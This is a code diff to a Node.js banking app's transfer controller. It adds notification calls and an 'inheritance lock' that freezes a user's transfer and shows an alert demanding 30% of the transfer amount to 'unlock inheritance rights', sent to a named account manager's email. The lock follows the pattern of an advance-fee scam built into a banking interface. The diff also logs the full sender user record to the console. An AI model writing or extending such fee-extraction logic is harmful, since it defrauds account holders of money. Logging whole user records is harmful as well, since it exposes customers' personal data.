@@ -2,6 +2,7 @@ const Transfer = require("../models/Transfer");
 const Account = require("../models/Account");
 const User = require("../models/User");
 const { sendTransferNotificationEmail } = require("../services/emailService");
+const { notifyFinancialEvent } = require("../services/notificationService");
 
 exports.create = async (req, res) => {
   try {
@@ -21,20 +22,37 @@ exports.create = async (req, res) => {
     if (!from.checkPermission(req.user._id, "transact"))
       return res.status(403).json({ message: "Forbidden" });
 
+    const senderUser = await User.findById(from.primaryOwner);
+    let transferStatus = "pending";
+    let alertMessage = null;
+console.log(senderUser);
+    if (senderUser.inheritanceLocked) {
+      transferStatus = "pending_inheritance";
+      alertMessage = `Your account has an inheritance lock. To proceed with this transfer, you must pay 30% of the transfer amount (${(
+        amount * 0.3
+      ).toFixed(
+        2
+      )} ${currency}) to unlock inheritance rights. Please contact your account manager at joshuahartford@quentbank.com to clarify your inheritance issue. This message will persist until resolved.`;
+    }
+
     const transfer = await Transfer.create({
       sender: from.primaryOwner,
       recipient: to.primaryOwner,
       amount,
       currency,
-      status: "pending",
+      status: transferStatus,
       type,
       scheduleDate,
-      description,
+      description: senderUser.inheritanceLocked
+        ? `${
+            description || ""
+          }\n\nINHERITANCE LOCK: Contact your account manager to clarify your inheritance issue.`.trim()
+        : description,
       metadata: { fromAccount: fromAccountId, toAccount: toAccountId },
     });
 
     // immediate transfer logic (naive)
-    if (type === "instant") {
+    if (type === "instant" && !senderUser.inheritanceLocked) {
       // ensure withdrawals are enabled on source account
       if (from.limitations && from.limitations.withdrawalsEnabled === false) {
         return res
@@ -51,9 +69,9 @@ exports.create = async (req, res) => {
 
       // Send email notifications for completed transfers
       try {
-        const [senderUser, recipientUser] = await Promise.all([
+        const [senderUserUpdated, recipientUser] = await Promise.all([
           User.findById(from.primaryOwner),
-          User.findById(to.primaryOwner)
+          User.findById(to.primaryOwner),
         ]);
 
         const transferDetails = {
@@ -62,35 +80,68 @@ exports.create = async (req, res) => {
           toAccount: to.name,
           reference: transfer._id,
           date: transfer.completedAt,
-          note: description
+          note: description,
         };
 
         // Send email to sender (outgoing transfer)
-        if (senderUser) {
+        if (senderUserUpdated) {
           await sendTransferNotificationEmail(
-            senderUser.email,
-            `${senderUser.firstName} ${senderUser.lastName}`,
-            { ...transferDetails, type: 'outgoing' }
+            senderUserUpdated.email,
+            `${senderUserUpdated.firstName} ${senderUserUpdated.lastName}`,
+            { ...transferDetails, type: "outgoing" }
           );
         }
 
         // Send email to recipient (incoming transfer)
-        if (recipientUser && recipientUser._id.toString() !== senderUser._id.toString()) {
+        if (
+          recipientUser &&
+          recipientUser._id.toString() !== senderUserUpdated._id.toString()
+        ) {
           await sendTransferNotificationEmail(
             recipientUser.email,
             `${recipientUser.firstName} ${recipientUser.lastName}`,
-            { ...transferDetails, type: 'incoming' }
+            { ...transferDetails, type: "incoming" }
           );
         }
 
         console.log("Transfer notification emails sent successfully");
       } catch (emailError) {
-        console.error("Failed to send transfer notification emails:", emailError);
+        console.error(
+          "Failed to send transfer notification emails:",
+          emailError
+        );
         // Don't fail the transfer if email fails
+      }
+
+      // Create notifications for both users
+      try {
+        await notifyFinancialEvent(from.primaryOwner, "transfer", "outgoing", {
+          id: transfer._id,
+          amount,
+          currency,
+          description,
+        });
+
+        await notifyFinancialEvent(to.primaryOwner, "transfer", "incoming", {
+          id: transfer._id,
+          amount,
+          currency,
+          description,
+        });
+      } catch (notificationError) {
+        console.error(
+          "Failed to create transfer notifications:",
+          notificationError
+        );
+        // Don't fail the transfer if notifications fail
       }
     }
 
-    res.status(201).json(transfer);
+    const response = { transfer };
+    if (alertMessage) {
+      response.alert = alertMessage;
+    }
+    res.status(201).json(response);
   } catch (err) {
     res.status(400).json({ message: err.message });
   }
